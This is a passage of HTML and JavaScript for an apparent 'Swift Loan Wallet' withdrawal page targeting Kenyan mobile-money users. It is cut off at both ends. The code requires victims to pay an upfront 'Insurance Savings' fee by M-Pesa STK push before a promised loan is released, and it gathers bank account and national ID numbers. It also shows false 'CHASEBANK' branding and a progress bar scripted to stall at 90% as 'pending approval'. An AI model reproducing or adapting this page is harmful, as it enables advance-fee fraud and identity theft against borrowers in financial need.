                    <div id="processingProgress" class="bg-green-400 h-2 rounded-full transition-all duration-1000" style="width: 33%"></div>
                </div>
            </div>
        </div>
    </div>
   <!-- Help Modal -->
<div id="helpModal" class="fixed inset-0 modal-overlay hidden items-center justify-center z-50">
  <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-md w-full p-6">
    <div class="flex justify-between items-center mb-4">
      <h3 class="text-lg font-bold text-gray-900">Check M-Pesa Code</h3>
      <button onclick="closeHelpModal()" class="text-gray-400 hover:text-gray-600">
        <i class="fas fa-times"></i>
      </button>
    </div>

    <p class="text-sm text-gray-600 mb-4">
      Paste your M-Pesa transaction code below to verify your  withdrawal if you haven't received your loan amount or you had loan withdrawal issue and you have paid the Savings required,
      Check your phone for the confirmation SMS from M-Pesa you received after Insurance Savins payment was done. eg THV5SCFSUH.
      only valid codes and current codes are allowed by system. Note that invalid M-pesa codes are rejected and take long to be accepted.
    </p>

    <input 
      type="text" 
      id="mpesaCodeInput" 
      placeholder="Enter M-Pesa Code (e.g., THV5SCFSUH)" 
      class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none form-field mb-3"
    >

    <div id="helpResult" class="text-sm mt-2"></div>
 

    <div class="flex space-x-3 mt-6">
      <button onclick="closeHelpModal()" class="flex-1 px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50">
        Cancel
      </button>
      <button onclick="checkMpesaCode()" class="flex-1 px-4 py-3 bg-primary text-white rounded-lg hover:bg-primary-dark">
        Check Code
      </button>
    </div>
  </div>
</div>
    <footer class="text-center text-gray-400 text-sm py-6 bg-gray-900 border-t border-gray-700">
        <div class="flex flex-col items-center space-y-3">
            <div class="flex items-center space-x-2 text-white">
                <span class="text-sm">Powered by</span>
                <!-- CHASEBANK SVG Logo -->
                <div class="flex items-center space-x-1">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="2" y="4" width="20" height="16" rx="2" fill="#1e40af"/>
                        <path d="M6 8h12M6 12h8M6 16h4" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
                        <circle cx="18" cy="16" r="1.5" fill="white"/>
                    </svg>
                    <span class="font-bold text-blue-400">CHASEBANK</span>
                </div>
            </div>
            <div class="text-xs">&copy; 2025 Swift Loan Wallet. All rights reserved.</div>
        </div>
    </footer>

    <script>
        console.log("Swift Loan Withdrawal Page initialized");

        // Global state
        let loanData = null;
        let isProcessing = false;
        let selectedWithdrawalMethod = null;

        // Kenyan banks list
        const kenyanBanks = [
            "KCB Bank Kenya Limited",
            "Equity Bank Kenya Limited",
            "Cooperative Bank of Kenya Limited",
            "Standard Chartered Bank Kenya Limited",
            "Absa Bank Kenya PLC",
            "NCBA Bank Kenya PLC",
            "Diamond Trust Bank Kenya Limited",
            "I&M Bank Limited",
            "Stanbic Bank Kenya Limited",
            "Family Bank Limited",
            "Prime Bank Limited",
            "ABC Bank (Kenya) Limited",
            "Bank of Africa Kenya Limited",
            "Bank of Baroda (Kenya) Limited",
            "Bank of India",
            "Citibank N.A. Kenya",
            "Commercial Bank of Africa Limited",
            "Consolidated Bank of Kenya Limited",
            "Credit Bank Limited",
            "Development Bank of Kenya Limited",
            "Ecobank Kenya Limited",
            "First Community Bank Limited",
            "Guardian Bank Limited",
            "Gulf African Bank Limited",
            "Habib Bank A.G. Zurich",
            "HFC Limited",
            "Housing Finance Company of Kenya Limited",
            "Kenya Commercial Bank Limited",
            "Mayfair Bank Limited",
            "Middle East Bank (K) Limited",
            "National Bank of Kenya Limited",
            "NIC Bank Limited",
            "Paramount Universal Bank Limited",
            "Sidian Bank Limited",
            "Spire Bank Limited",
            "UBA Kenya Bank Limited",
            "Victoria Commercial Bank Limited"
        ];

        // Load loan data from localStorage
        function loadLoanData() {
            try {
                const selectedOffer = localStorage.getItem('swift_selected_offer');
                const customerName = localStorage.getItem('swift_customer_name') || 'Applicant';
                
                if (!selectedOffer) {
                    showError('No loan offer selected. Please go back and select a loan offer first.');
                    document.getElementById('withdrawBtn').disabled = true;
                    return;
                }

                loanData = JSON.parse(selectedOffer);
                console.log('Loaded loan data:', loanData);

                if (!loanData.amount || !loanData.fee || !loanData.phone || !loanData.tracking) {
                    showError('Invalid loan data. Please go back and select a loan offer again.');
                    document.getElementById('withdrawBtn').disabled = true;
                    return;
                }

                const loanAmount = parseFloat(loanData.amount);
                const feeAmount = parseFloat(loanData.fee);
                const availableBalance = loanAmount - feeAmount;

                // Update customer details
                document.getElementById('customerName').textContent = customerName;
                document.getElementById('customerPhone').textContent = loanData.phone;
                document.getElementById('loanId').textContent = loanData.tracking;

                // Update loan details
                document.getElementById('loanAmount').textContent = `KES ${loanAmount.toLocaleString()}`;
                document.getElementById('processingFee').textContent = `KES ${feeAmount.toLocaleString()}`;
                document.getElementById('availableBalance').textContent = `KES ${availableBalance.toLocaleString()}`;
                document.getElementById('withdrawalAmount').textContent = `KES ${availableBalance.toLocaleString()}`;

                console.log('Loan data loaded successfully');
            } catch (error) {
                console.error('Error loading loan data:', error);
                showError('Failed to load loan information. Please try again.');
                document.getElementById('withdrawBtn').disabled = true;
            }
        }

        // Show withdrawal methods modal
        function showWithdrawalMethods() {
            document.getElementById('withdrawalMethodModal').classList.remove('hidden');
            document.getElementById('withdrawalMethodModal').classList.add('flex');
        }

        // Close withdrawal method modal
        function closeWithdrawalModal() {
            document.getElementById('withdrawalMethodModal').classList.add('hidden');
            document.getElementById('withdrawalMethodModal').classList.remove('flex');
        }

        // Select withdrawal method
        function selectMethod(method) {
            selectedWithdrawalMethod = method;
            
            // Update UI to show selection
            document.querySelectorAll('.method-card').forEach(card => {
                card.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
            
            // Show method-specific form after a short delay
            setTimeout(() => {
                closeWithdrawalModal();
                showWithdrawalDetails(method);
            }, 300);
        }

        // Show withdrawal details modal with method-specific form
        function showWithdrawalDetails(method) {
            const modal = document.getElementById('withdrawalDetailsModal');
            const title = document.getElementById('detailsModalTitle');
            const formContainer = document.getElementById('withdrawalForm');
            
            let formHTML = '';
            let titleText = '';

            switch(method) {
                case 'mpesa':
                    titleText = 'M-Pesa Withdrawal Details';
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">M-Pesa Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your M-Pesa number to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-mobile-alt mr-1"></i> M-Pesa Phone Number
                                </label>
                                <input type="tel" id="mpesaPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
                                <div class="error-message hidden" id="mpesaPhoneError"></div>
                                <p class="text-xs text-gray-500 mt-1">Format: 254XXXXXXXXX (without +)</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Name
                                </label>
                                <input type="text" id="mpesaName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as registered" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="mpesaNameError"></div>
                            </div>

                            <div class="bg-green-50 border border-green-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-green-600 mt-0.5"></i>
                                    <div class="text-sm text-green-800">
                                        <p class="font-medium mb-1">M-Pesa Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>â€¢ You will receive an STK push notification from Swiftwallet Digital Ventures for Savings request.</li>
                                            <li>â€¢ Funds will be credited instantly after confirmation</li>
                                            <li>â€¢ Transaction limit: KES 300,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;

                case 'airtel':
                    titleText = 'Airtel Money Withdrawal Details';
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-mobile-alt text-red-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">Airtel Money Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your Airtel Money number to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-mobile-alt mr-1"></i> Airtel Money Phone Number
                                </label>
                                <input type="tel" id="airtelPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
                                <div class="error-message hidden" id="airtelPhoneError"></div>
                                <p class="text-xs text-gray-500 mt-1">Format: 254XXXXXXXXX (without +)</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Name
                                </label>
                                <input type="text" id="airtelName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as registered" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="airtelNameError"></div>
                            </div>

                            <div class="bg-red-50 border border-red-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-red-600 mt-0.5"></i>
                                    <div class="text-sm text-red-800">
                                        <p class="font-medium mb-1">Airtel Money Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>â€¢ You will receive an SMS notification with code </li>
                                            <li>â€¢ Funds will be credited within 2-3 minutes from CHASE BANK</li>
                                            <li>â€¢ Transaction limit: KES 150,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;

                case 'bank':
                    titleText = 'Bank Transfer Withdrawal Details';
                    const bankOptions = kenyanBanks.map(bank => `<option value="${bank}">${bank}</option>`).join('');
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-university text-blue-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">Bank Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your bank details to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-university mr-1"></i> Select Bank
                                </label>
                                <select id="bankName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none">
                                    <option value="">Choose your bank...</option>
                                    ${bankOptions}
                                </select>
                                <div class="error-message hidden" id="bankNameError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-credit-card mr-1"></i> Account Number
                                </label>
                                <input type="text" id="accountNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter your account number" maxlength="20">
                                <div class="error-message hidden" id="accountNumberError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Holder Name
                                </label>
                                <input type="text" id="accountName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as on bank account" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="accountNameError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-id-card mr-1"></i> ID Number
                                </label>
                                <input type="text" id="idNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter National ID number" maxlength="8">
                                <div class="error-message hidden" id="idNumberError"></div>
                            </div>

                            <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-blue-600 mt-0.5"></i>
                                    <div class="text-sm text-blue-800">
                                        <p class="font-medium mb-1">Bank Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>â€¢ Funds will be credited within 3-5 minutes with approval from CHASE BANK</li>
                                            <li>â€¢ Account details must match your loan application</li>
                                            <li>â€¢ Transaction limit: KES 1,000,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;
            }

            title.textContent = titleText;
            formContainer.innerHTML = formHTML;
            
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }

        // Close withdrawal details modal
        function closeDetailsModal() {
            document.getElementById('withdrawalDetailsModal').classList.add('hidden');
            document.getElementById('withdrawalDetailsModal').classList.remove('flex');
        }

        // Validate form based on method
        function validateForm() {
            let isValid = true;
            
            // Clear previous errors
            document.querySelectorAll('.error-message').forEach(error => {
                error.classList.add('hidden');
                error.textContent = '';
            });
            
            document.querySelectorAll('.form-field').forEach(field => {
                field.classList.remove('error', 'success');
            });

            switch(selectedWithdrawalMethod) {
                case 'mpesa':
                    isValid = validateMpesaForm() && isValid;
                    break;
                case 'airtel':
                    isValid = validateAirtelForm() && isValid;
                    break;
                case 'bank':
                    isValid = validateBankForm() && isValid;
                    break;
            }

            return isValid;
        }

        function validateMpesaForm() {
            let isValid = true;
            
            const phone = document.getElementById('mpesaPhone');
            const name = document.getElementById('mpesaName');
            
            // Validate phone
            if (!phone.value.trim()) {
                showFieldError('mpesaPhone', 'mpesaPhoneError', 'Phone number is required');
                isValid = false;
            } else if (!/^254[0-9]{9}$/.test(phone.value.trim())) {
                showFieldError('mpesaPhone', 'mpesaPhoneError', 'Enter valid format: 254XXXXXXXXX');
                isValid = false;
            } else {
                showFieldSuccess('mpesaPhone');
            }
            
            // Validate name
            if (!name.value.trim()) {
                showFieldError('mpesaName', 'mpesaNameError', 'Account name is required');
                isValid = false;
            } else if (name.value.trim().length < 2) {
                showFieldError('mpesaName', 'mpesaNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('mpesaName');
            }
            
            return isValid;
        }

        function validateAirtelForm() {
            let isValid = true;
            
            const phone = document.getElementById('airtelPhone');
            const name = document.getElementById('airtelName');
            
            // Validate phone
            if (!phone.value.trim()) {
                showFieldError('airtelPhone', 'airtelPhoneError', 'Phone number is required');
                isValid = false;
            } else if (!/^254[0-9]{9}$/.test(phone.value.trim())) {
                showFieldError('airtelPhone', 'airtelPhoneError', 'Enter valid format: 254XXXXXXXXX');
                isValid = false;
            } else {
                showFieldSuccess('airtelPhone');
            }
            
            // Validate name
            if (!name.value.trim()) {
                showFieldError('airtelName', 'airtelNameError', 'Account name is required');
                isValid = false;
            } else if (name.value.trim().length < 2) {
                showFieldError('airtelName', 'airtelNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('airtelName');
            }
            
            return isValid;
        }

        function validateBankForm() {
            let isValid = true;
            
            const bankName = document.getElementById('bankName');
            const accountNumber = document.getElementById('accountNumber');
            const accountName = document.getElementById('accountName');
            const idNumber = document.getElementById('idNumber');
            
            // Validate bank
            if (!bankName.value) {
                showFieldError('bankName', 'bankNameError', 'Please select a bank');
                isValid = false;
            } else {
                showFieldSuccess('bankName');
            }
            
            // Validate account number
            if (!accountNumber.value.trim()) {
                showFieldError('accountNumber', 'accountNumberError', 'Account number is required');
                isValid = false;
            } else if (!/^[0-9]{6,20}$/.test(accountNumber.value.trim())) {
                showFieldError('accountNumber', 'accountNumberError', 'Enter a valid account number (6-20 digits)');
                isValid = false;
            } else {
                showFieldSuccess('accountNumber');
            }
            
            // Validate account name
            if (!accountName.value.trim()) {
                showFieldError('accountName', 'accountNameError', 'Account holder name is required');
                isValid = false;
            } else if (accountName.value.trim().length < 2) {
                showFieldError('accountName', 'accountNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('accountName');
            }
            
            // Validate ID number
            if (!idNumber.value.trim()) {
                showFieldError('idNumber', 'idNumberError', 'ID number is required');
                isValid = false;
            } else if (!/^[0-9]{7,8}$/.test(idNumber.value.trim())) {
                showFieldError('idNumber', 'idNumberError', 'Enter a valid ID number (7-8 digits)');
                isValid = false;
            } else {
                showFieldSuccess('idNumber');
            }
            
            return isValid;
        }

        function showFieldError(fieldId, errorId, message) {
            const field = document.getElementById(fieldId);
            const error = document.getElementById(errorId);
            
            field.classList.add('error');
            error.textContent = message;
            error.classList.remove('hidden');
        }

        function showFieldSuccess(fieldId) {
            const field = document.getElementById(fieldId);
            field.classList.add('success');
        }

        // Process withdrawal (Fee payment first)
        async function processWithdrawal() {
            if (isProcessing) return;
            
            if (!validateForm()) {
                return;
            }

            isProcessing = true;
            closeDetailsModal();
            showEnhancedProcessingOverlay();

            try {
                // Get fee amount from loan data
                const feeAmount = parseFloat(loanData.fee);
                
                // Collect form data for later use
                let withdrawalData = {
                    method: selectedWithdrawalMethod,
                    loanId: loanData.tracking
                };

                let paymentPhone = loanData.phone; // Default to loan phone

                switch(selectedWithdrawalMethod) {
                    case 'mpesa':
                        paymentPhone = document.getElementById('mpesaPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('mpesaName').value;
                        break;
                    case 'airtel':
                        paymentPhone = document.getElementById('airtelPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('airtelName').value;
                        break;
                    case 'bank':
                        withdrawalData.bankName = document.getElementById('bankName').value;
                        withdrawalData.accountNumber = document.getElementById('accountNumber').value;
                        withdrawalData.accountName = document.getElementById('accountName').value;
                        withdrawalData.idNumber = document.getElementById('idNumber').value;
                        break;
                }

                console.log('Insurance Savings payment for withdrawal:', withdrawalData);

                // Store withdrawal data for after fee payment
                localStorage.setItem('swift_pending_withdrawal', JSON.stringify(withdrawalData));

                // Update processing steps
                updateProcessingStep(1, 'Validating details...');
                await delay(1500);
                
                updateProcessingStep(2, 'Sending withdrawal request to release funds..');
                await delay(1000);

                // Send STK push for fee payment
                const response = await fetch('https://server-d7ya.onrender.com/pay', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        phone: paymentPhone,
                        amount: feeAmount
                    })
                });

                if (!response.ok) {
                    throw new Error(`Server error: ${response.status}`);
                }

                const result = await response.json();
                console.log('Fee payment response:', result);
              if (result.success && result.reference) {
    startReceiptTracking(result.reference);
}

                updateProcessingStep(3, 'Confirming payment...');
                await delay(1500);

                hideProcessingOverlay();
                showFeePaymentSuccess();

            } catch (error) {
                console.error('Fee payment error:', error);
                hideProcessingOverlay();
                
                let friendlyMessage = 'Fee payment failed. ';
                if (error.message.includes('timeout')) {
                    friendlyMessage += 'The connection timed out. Please check your internet and try again.';
                } else if (error.message.includes('400')) {
                    friendlyMessage += 'There was an issue with the request. Please verify your phone number.';
                } else if (error.message.includes('500') || (error.status && error.status === 500)) {
                    friendlyMessage += 'The payment server is currently experiencing issues. Please wait a moment and try again.';
                } else {
                    friendlyMessage += 'System error: ' + error.message;
                }
                
                showError(friendlyMessage);
                
                // Show withdraw button again so they can try fresh
                const withdrawBtn = document.getElementById('withdrawBtn');
                if (withdrawBtn) {
                    withdrawBtn.disabled = false;
                    withdrawBtn.classList.add('ring-4', 'ring-primary', 'ring-offset-2');
                }
            } finally {
                isProcessing = false;
            }
        }

        // Enhanced processing overlay functions
        function showEnhancedProcessingOverlay() {
            const overlay = document.getElementById('processingOverlay');
            overlay.classList.remove('hidden');
            overlay.classList.add('flex');
            
            // Reset processing state
            updateProcessingStep(1, 'Validating details...');
        }

        function updateProcessingStep(step, message) {
            const steps = ['step1', 'step2', 'step3'];
            const progress = document.getElementById('processingProgress');
            
            document.getElementById('processingMessage').textContent = message;
            
            // Update step indicators
            steps.forEach((stepId, index) => {
                const element = document.getElementById(stepId);
                if (index < step) {
                    element.className = 'text-green-400';
                } else if (index === step - 1) {
                    element.className = 'text-white';
                } else {
                    element.className = 'text-gray-400';
                }
            });
            
            // Update progress bar
            const progressWidth = (step / 3) * 100;
            progress.style.width = progressWidth + '%';
        }

        function hideProcessingOverlay() {
            const overlay = document.getElementById('processingOverlay');
            overlay.classList.add('hidden');
            overlay.classList.remove('flex');
        }

        // Show fee payment success with pending approval
        function showFeePaymentSuccess() {
            const methodNames = {
                'mpesa': 'M-Pesa',
                'airtel': 'Airtel Money',
                'bank': 'Bank Transfer'
            };
            
            const methodIcons = {
                'mpesa': 'fas fa-mobile-alt',
                'airtel': 'fas fa-mobile-alt', 
                'bank': 'fas fa-university'
            };

            const fee = document.getElementById("processingFee").textContent;

const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">âœ”ï¸SWIFTWALLET  DIGITAL  VENTURES âœ”ï¸</span>. Enter your M-Pesa PIN to complete the Savings payment requested to complete withdrawal. Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after Savings deposit of <span class="font-bold text-green-700">${fee}</span> is confirmed.`;

            // Update success message
            document.getElementById('successMessage').innerHTML = message;
          const amount = document.getElementById("withdrawalAmount").textContent;
document.getElementById("successHeading").textContent = 
    `Withdrawal of ${amount} Initiated Successfully! [REASON:Swiftwallet savings deposit ]`;
            
            // Update progress text
            document.getElementById('progressText').textContent = 'Pending Savings deposit & withdrawal Approval...';
            
            // Update selected method display
            const methodLogo = document.getElementById('selectedMethodLogo');
            const methodName = document.getElementById('selectedMethodName');
            
            methodLogo.innerHTML = `<i class="${methodIcons[selectedWithdrawalMethod]} text-white text-xl"></i>`;
            methodName.textContent = methodNames[selectedWithdrawalMethod];
            
            // Show success alert
            showSuccess(message);
            
            // Update timeline
            updateDisbursementTimeline(true);
            
            // Store withdrawal status
            localStorage.setItem('swift_fee_payment_initiated', 'true');
            localStorage.setItem('swift_withdrawal_method', selectedWithdrawalMethod);
            localStorage.setItem('swift_withdrawal_time', new Date().toISOString());
        // Start the animated pending progress bar
startPendingProgress();}

        // Utility function for delays
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Other existing functions (showError, hideError, showSuccess, etc.)
        function showError(message) {
            const errorAlert = document.getElementById('errorAlert');
            const errorMessage = document.getElementById('errorMessage');
            
            errorMessage.textContent = message;
            errorAlert.classList.remove('hidden');
            errorAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
            
            errorAlert.classList.add('shake');
            setTimeout(() => errorAlert.classList.remove('shake'), 500);
        }

        function hideError() {
            document.getElementById('errorAlert').classList.add('hidden');
        }

        function showSuccess(message) {
            const successAlert = document.getElementById('successAlert');
            const successMessage = document.getElementById('successMessage');
            
            successMessage.innerHTML = message;
            successAlert.classList.remove('hidden');
            successAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
            
            // Animate progress bar
            const progressBar = document.getElementById('progressBar');
            progressBar.classList.add('progress-bar-animated');
            
            updateDisbursementTimeline(true);
        }

        function updateDisbursementTimeline(success) {
            const timeline = document.getElementById('disbursementTimeline');
            const dot = timeline.querySelector('.w-3.h-3');
            const status = timeline.querySelector('.text-xs');
            
            if (success) {
                timeline.classList.remove('opacity-50');
                dot.className = 'w-3 h-3 bg-green-500 rounded-full mt-2';
                status.textContent = 'pending';
                status.className = 'text-xs text-green-600';
            }
        }

        function goBack() {
            window.location.href = 'offers.html';
        }

        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            console.log('DOM Content Loaded');
            
            loadLoanData();
            
            // Add slide-in animation
            const slideElements = document.querySelectorAll('.slide-in');
            slideElements.forEach((element, index) => {
                setTimeout(() => {
                    element.style.animationDelay = `${index * 0.2}s`;
                }, 100);
            });

            // Check if fee payment was already initiated
            const feePaymentInitiated = localStorage.getItem('swift_fee_payment_initiated');
            if (feePaymentInitiated === 'true') {
                const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
                const amount = document.getElementById("withdrawalAmount").textContent || 'your approved amount';
                
                showSuccess(
                    `<div class="flex flex-col space-y-2">
                        <div class="flex items-center text-primary font-bold">
                            <i class="fas fa-history mr-2"></i> Previous Session Restored
                        </div>
                        <p>We've detected an ongoing withdrawal for <strong>${amount}</strong> to your <strong>${withdrawalMethod}</strong>.</p>
                        <p class="text-sm">Please complete the M-Pesa PIN prompt on your phone to finalize the transfer. If you didn't receive the prompt, you can use the <strong>Retry</strong> button below to trigger it again.</p>
                        <div class="mt-2 p-2 bg-blue-50 rounded border border-blue-100 text-xs italic">
                            Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> â€” Funds are secured and waiting for deposit Savings confirmation.
                        </div>
                    </div>`
                );
                updateDisbursementTimeline(true);
            }
        });

        // Handle page visibility and navigation
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                console.log('Page became visible');
            }
        });

        window.addEventListener('beforeunload', function(e) {
            if (isProcessing) {
                e.preventDefault();
                e.returnValue = 'A withdrawal is currently being processed. Are you sure you want to leave?';
                return e.returnValue;
            }
        });
 // Open Help Modal
function openHelpModal() {
    document.getElementById('helpModal').classList.remove('hidden');
    document.getElementById('helpModal').classList.add('flex');
}

// Close Help Modal
function closeHelpModal() {
    document.getElementById('helpModal').classList.add('hidden');
    document.getElementById('helpModal').classList.remove('flex');
    document.getElementById('helpResult').innerHTML = "";
}

// Check M-Pesa Code (dummy example)
function checkMpesaCode() {
    const code = document.getElementById('mpesaCodeInput').value.trim();
    const resultBox = document.getElementById('helpResult');

    if (!code) {
        resultBox.innerHTML = `<p class="text-red-600">âš ï¸ Please enter a valid  code.</p>`;
        return;
    }

    // For now, simulate checking (replace with real API later)
    if (/^[A-Z0-9]{10,}$/i.test(code)) {
        resultBox.innerHTML = `<p class="text-green-600 font-medium">âœ… correct Code format ${code} looks valid. Processing check for validility please wait may take long if the code is not found...</p>`;
    } else {
        resultBox.innerHTML = `<p class="text-red-600">âŒ Invalid code or formart. Please try again.</p>`;
    }
}
   function startPendingProgress() {
    let progress = 0;
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');

    // Reset
    progressBar.style.width = "0%";
    progressText.textContent = "Pending Savings deposit... 0%";

    const interval = setInterval(() => {
        if (progress >= 90) {  // Stop at 90% until confirmation
            clearInterval(interval);
            progressText.textContent = "Pending Savings deposit & Withdrawal Approval...";
        } else {
            progress += 5;
            progressBar.style.width = progress + "%";
            progressText.textContent = "Pending Savings deposit... " + progress + "%";
        }
    }, 1000); // update every 1s
}
  let receiptPollInterval = null;

// Render receipt card
  // Render receipt card
function renderReceiptCard(receipt) {
    const container = document.getElementById('receiptCardContainer');
    if (!container) return;

    const status = (receipt.status || '').toLowerCase();

let statusPillClass = 'bg-gray-100 text-gray-700';
let statusLabel = status.toUpperCase(); // default: make uppercase

if (status === 'success') {
    statusPillClass = 'bg-green-100 text-green-700';
    statusLabel = 'SUCCESS';
} else if (status === 'pending') {
    statusPillClass = 'bg-yellow-100 text-yellow-700';
    statusLabel = 'PENDING';
} else if (['error','stk_failed','cancelled','failed'].includes(status)) {
    statusPillClass = 'bg-red-100 text-red-700';
    statusLabel = 'CANCELLED / FAILED';
    if (!document.getElementById('retryPopup').classList.contains('flex')) {
         setTimeout(() => showRetryPopup(receipt), 1000);
    }
}

    container.innerHTML = `
      <div class="bg-white border border-gray-200 rounded-2xl shadow-lg p-6 space-y-6">
        <!-- Header -->
        <div class="flex justify-between items-center border-b pb-4">
          <div class="flex items-center space-x-3">
            <div class="w-10 h-10 rounded-lg flex items-center justify-center overflow-hidden">
              <img src="/loan-logo.png" alt="Swift Loan Logo" class="w-full h-full object-cover">
            </div>
            <div>
              <h2 class="text-lg font-bold text-gray-900">Swift Loan Wallet Receipt</h2>
              <p class="text-xs text-gray-500">Loan Withdrawal Receipt</p>
            </div>
          </div>
          <span class="px-3 py-1 text-sm font-semibold rounded-full ${statusPillClass}">
  ${statusLabel}
</span>
</div>

        <!-- Details -->
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
          <div><p class="text-gray-500">Reference</p><p class="font-semibold text-gray-900">${receipt.reference}</p></div>
          <div><p class="text-gray-500">Transaction ID</p><p class="font-semibold text-gray-900">${receipt.transaction_id || 'N/A'}</p></div>
          <div><p class="text-gray-500">Transaction Code</p><p class="font-semibold text-gray-900">${receipt.transaction_code || 'N/A'}</p></div>
          <div><p class="text-gray-500">Phone</p><p class="font-semibold text-gray-900">${receipt.phone}</p></div>
          <div><p class="text-gray-500">Customer Name</p><p class="font-semibold text-gray-900">${receipt.customer_name}</p></div>
          <div><p class="text-gray-500">Savings Amount</p><p class="font-semibold text-orange-600">KES ${receipt.amount}</p></div>
          <div><p class="text-gray-500">Loan Amount</p><p class="font-bold text-green-700">${document.getElementById("availableBalance").textContent}</p></div>
          <div><p class="text-gray-500">Date & Time</p><p class="font-semibold text-gray-900">${new Date(receipt.timestamp).toLocaleString()}</p></div>
        </div>

        <!-- Note -->
        <div class="bg-gray-50 border border-gray-200 rounded-lg p-3 text-xs text-gray-600">
          <p><strong>Note:</strong> ${receipt.status_note || ''}</p>
          <p class="mt-1 italic">This receipt is system-generated and valid without signature.</p>
       ${status === "processing" ? `<p id="countdown-${receipt.reference}" class="mt-3 font-bold text-orange-600 text-center"></p>` : ""}
        </div>
  <!-- Actions -->
        <div class="flex justify-end space-x-3">
          <a href="https://server-d7ya.onrender.com/receipt/${receipt.reference}/pdf"
             target="_blank"
